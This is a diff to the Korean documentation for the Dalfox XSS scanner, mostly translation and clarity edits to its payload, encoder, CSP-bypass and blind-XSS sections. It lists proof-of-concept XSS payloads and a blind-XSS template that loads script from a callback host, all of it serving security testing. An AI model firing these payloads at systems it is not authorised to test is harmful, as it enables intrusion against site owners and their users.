@@ -13,15 +13,15 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 
 | 계열 | 예시 | 사용 시점 |
 |--------|---------|-----------|
-| **HTML tag** | `<svg onload=alert(1)>` | HTML 컨텍스트 |
-| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | 속성 내부 |
+| **HTML 태그** | `<svg onload=alert(1)>` | HTML 컨텍스트 |
+| **속성 브레이크아웃** | `'><img src=x onerror=alert(1)>` | 속성 내부 |
 | **JavaScript** | `";alert(1);//` | `<script>` 블록 내부 |
-| **Event handler** | `onmouseover=alert(1)` | 기존 속성 값 |
-| **DOM clobbering** | `<img id=x>` | 레거시 DOM 조회 |
-| **URL protocol** | `javascript:alert(1)` | `href`/`src` 계열 속성 |
-| **CSP bypass** | `strict-dynamic` 스크립트 가젯, nonce 재사용, 허용된 호스트의 JSONP | 응답에 우회 가능한 CSP가 있을 때 |
+| **이벤트 핸들러** | `onmouseover=alert(1)` | 기존 속성 값 |
+| **DOM 클로버링** | `<img id=x>` | 레거시 DOM 조회 |
+| **URL 프로토콜** | `javascript:alert(1)` | `href`/`src` 계열 속성 |
+| **CSP 우회** | `strict-dynamic` 스크립트 가젯, nonce 재사용, 허용된 호스트의 JSONP | 응답에 우회 가능한 CSP가 있을 때 |
 | **mXSS** | `<foreignobject>`/DOMPurify 우회 | 새니타이저가 변형한 DOM |
-| **Blind** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` 또는 `--blind-oob`가 설정된 경우 |
+| **블라인드** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` 또는 `--blind-oob`가 설정된 경우 |
 
 대부분의 페이로드 템플릿은 마커(`class={CLASS}` 또는 `id={ID}`)를 지니고 있어, 검증 단계에서 DOM 내에서 자신의 요소를 확실하게 식별할 수 있습니다. 길이 제한이 있는 반사를 위해 마커 없는 짧은 페이로드도 몇 개 있는데, 이것만으로는 `R` 결과까지만 나옵니다.
 
@@ -39,7 +39,7 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 
 ## CSP 인식 우회 페이로드
 
-프리플라이트(preflight) 단계가 `Content-Security-Policy`(또는 `…-Report-Only`) 헤더나 `<meta http-equiv>` 등가물을 발견하면, Dalfox는 이를 파싱하여 스크립트 실행 페이로드를 해당 정책의 실제 약점에 맞게 조정합니다. 페이로드는 실제로 악용 가능한 지시어(directive)에 대해서만 생성되므로, CSP가 없는(또는 견고하게 설정된) 대상은 추가 요청을 보지 않습니다.
+프리플라이트(preflight) 단계가 `Content-Security-Policy`(또는 `…-Report-Only`) 헤더나 같은 정책을 담은 `<meta http-equiv>`를 발견하면, Dalfox는 이를 파싱하여 스크립트 실행 페이로드를 해당 정책의 실제 약점에 맞게 조정합니다. 페이로드는 실제로 악용 가능한 지시어(directive)에 대해서만 생성되므로, CSP가 없는(또는 견고하게 설정된) 대상은 추가 요청을 보지 않습니다.
 
 | CSP 형태 | Dalfox가 내보내는 페이로드 |
 |-----------|-------------------|
@@ -62,7 +62,7 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 
 - **엄격한(strict)** 정책 콜백(`createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})`)은 다른 새니타이저와 마찬가지로 오염(taint)을 제거하므로, `p.createHTML(x)`를 거쳐 전달된 값은 더 이상 보고되지 않습니다.
 - **관대한(permissive)** 기본 정책(우회 가능한 것으로 잘 알려진 no-op `createPolicy('default', {createHTML: x => x})`)은 보호 수단으로 *오인되지 않습니다*. 탐지 결과는 유지되고 플래그가 지정됩니다.
-- 응답 CSP가 `require-trusted-types-for 'script'`를 강제하고 **그리고** 페이지가 엄격한 `'default'` 정책을 정의하면, 브라우저가 모든 TrustedHTML 싱크를 자동으로 새니타이즈합니다. Dalfox는 이 경우 오탐이 될 탐지 결과를 억제합니다.
+- 응답 CSP가 `require-trusted-types-for 'script'`를 강제하고, **동시에** 페이지가 엄격한 `'default'` 정책을 정의하면, 브라우저가 모든 TrustedHTML 싱크를 자동으로 새니타이즈합니다. Dalfox는 이 경우 오탐이 될 탐지 결과를 억제합니다.
 
 이 분류기는 의도적으로 보수적입니다. 안전함을 입증할 수 없는 것은 무엇이든 관대한(permissive) 상태로 남으므로, 탐지 결과가 유지됩니다. 억제는 강제(enforcement) 없이는 결코 발동하지 않으므로, 기본 정책을 정의했지만 `require-trusted-types-for`를 빠뜨린 페이지는 여전히 보고됩니다. 즉, 미탐(false negative)이 도입되지 않습니다.
 
@@ -76,18 +76,18 @@ dalfox scan https://target.app -e url,html,base64
 
 사용 가능한 인코더:
 
-| 인코더 | `<`를 변환하는 형태 |
-|---------|-------------------|
-| `none` | `<` (원시) |
-| `url` | `%3C` |
-| `2url` | `%253C` (2중) |
-| `3url` | `%25253C` (3중) |
-| `4url` | 4중 URL |
-| `html` | `&#x003c;` |
-| `htmlpad` | 0으로 패딩된 HTML 엔티티 |
-| `base64` | 페이로드의 base64 |
-| `unicode` | 전각(fullwidth) 매핑 |
-| `zwsp` | 폭 없는 공백(zero-width space) 삽입 |
+| 인코더 | `<`를 변환하는 형태 | 비고 |
+|---------|-------------------|------|
+| `none` | `<` (원시) | 인코딩을 끕니다(아래 참고) |
+| `url` | `%3C` | 1회 URL 인코딩 |
+| `2url` | `%253C` | 2중 URL 인코딩 |
+| `3url` | `%25253C` | 3중 |
+| `4url` | `%2525253C` | 4중 |
+| `html` | `&#x003c;` | 모든 문자를 16진 엔티티로 바꿉니다 |
+| `htmlpad` | `&#x000003c;` | 7자리로 0을 채운 16진 엔티티. 영문자, 숫자, 공백은 그대로 둡니다 |
+| `base64` | `PA==` | 페이로드 전체를 base64로 인코딩 |
+| `unicode` | `＜` | 출력 가능한 ASCII 문자를 전각(fullwidth) 문자(U+FF01–U+FF5E)로 매핑 |
+| `zwsp` | `<` + U+200B | `<` `>` `"` `'` `(` `)` `/` `;` 뒤에 폭 없는 공백(zero-width space) 삽입 |
 
 기본값: `url,html`. 원시 페이로드는 항상 함께 전송되므로, 활성화된 인코더마다 기본 페이로드당 변형이 하나씩 늘어납니다(기본값이면 페이로드마다 세 가지 형태로 보냅니다). 목록에 `none`을 추가하면, Dalfox는 원시 페이로드만 보냅니다.
 
@@ -99,13 +99,13 @@ dalfox scan https://target.app -e url,html,base64
 dalfox scan https://target.app --custom-payload mypayloads.txt
 ```
 
-로컬 내장 라이브러리 대신 사용자 지정 파일을 사용합니다:
+로컬 내장 라이브러리 대신 커스텀 파일을 사용합니다:
 
 ```bash
 dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
 ```
 
-`--custom-payload` 없이 `--only-custom-payload`만 주면 거부되며, 쓸 수 있는 줄이 하나도 없는 파일도 마찬가지입니다. 사용자 지정 파일이 로컬 반사 및 DOM 검사의 기본 페이로드가 됩니다. 적응형 합성과 CSP/기술 공유 페이로드는 추가하지 않습니다. 인코더와 WAF 변형은 사용자 지정 항목에서 파생되며, 명시적으로 요청한 `--remote-payloads`는 계속 사용됩니다.
+`--custom-payload` 없이 `--only-custom-payload`만 주면 거부되며, 쓸 수 있는 줄이 하나도 없는 파일도 마찬가지입니다. 커스텀 파일이 로컬 반사 및 DOM 검사의 기본 페이로드가 됩니다. 적응형 합성과 CSP/기술 공유 페이로드는 추가하지 않습니다. 인코더와 WAF 변형은 커스텀 항목에서 파생되며, 명시적으로 요청한 `--remote-payloads`는 계속 사용됩니다.
 
 ## 원격 페이로드 소스
 
@@ -134,7 +134,7 @@ dalfox scan https://target.app --remote-payloads portswigger,payloadbox
 | `awesome-alert` | 깔끔한 스크린샷/데모용으로 다듬어진 alert PoC를 출력합니다 (`alert(document.domain)` 등) | `dalfox payload awesome-alert` |
 | `dom-clobbering` | DOM 클로버링 페이로드를 출력합니다 | `dalfox payload dom-clobbering` |
 | `mxss` | mutation-XSS / 새니타이저 우회 페이로드를 출력합니다 | `dalfox payload mxss` |
-| `blind` | blind-XSS 스켈레톤을 출력합니다 (`{}` = 콜백 URL) | `dalfox payload blind` |
+| `blind` | blind-XSS 스켈레톤을 출력합니다 (`{}` = OOB 콜백 URL) | `dalfox payload blind` |
 | `all` | 위의 모든 로컬 셀렉터를 한 번에, 각 그룹 앞에 `# name` 헤더를 붙여 출력합니다 (원격 셀렉터 제외 — 네트워크 요청 없음) | `dalfox payload all` |
 
 ```bash
@@ -171,9 +171,11 @@ dalfox payload special-chars | wc -l
 전형적인 `alert(1)`은 요란할 수 있습니다. 이를 교체하면 곳곳에서 대화 상자를 띄우지 않고도 영향(impact)을 입증할 수 있습니다:
 
 ```bash
-dalfox scan https://target.app \
-  --custom-alert-value "document.domain" \
-  --custom-alert-type str
+# alert(document.domain): 값이 JavaScript 표현식으로 남음
+dalfox scan https://target.app --custom-alert-value document.domain
+
+# alert('dalfox'): 값이 문자열 리터럴이 됨
+dalfox scan https://target.app --custom-alert-value dalfox --custom-alert-type str
 ```
 
 - `--custom-alert-value`: 내장 `alert(1)` / `prompt(1)` / `confirm(1)` 호출(백틱 형태 포함)의 `1`을 이 값으로 바꿉니다. 기본값 `1`.
@@ -187,7 +189,7 @@ Blind XSS는 나중에, 직접 볼 수 없는 컨텍스트(관리자 패널, 지
 dalfox scan https://target.app -b https://your-callback.interact.sh
 ```
 
-커스텀 blind 템플릿:
+커스텀 블라인드 템플릿:
 
 ```bash
 dalfox scan https://target.app \
@@ -210,7 +212,7 @@ dalfox scan https://target.app --hpp
 
 적중하면 `inject_type`이 `inHTML-HPP`인 `R`로 보고됩니다. 중복 파라미터 처리를 통과했다는 뜻일 뿐 실행 가능한 위치에 도달했다는 증거는 아니므로, 직접 확인하세요.
 
-## Deep scan
+## 딥 스캔
 
 기본적으로 Dalfox는 검증된 페이로드를 찾으면 해당 파라미터에 대한 테스트를 중단합니다. `--deep-scan`은 계속 진행하며, 파라미터당 기본 페이로드 3000개라는 내장 상한도 해제합니다([CLI 레퍼런스](../../reference/cli/)의 `--max-payloads-per-param` 참고):
 
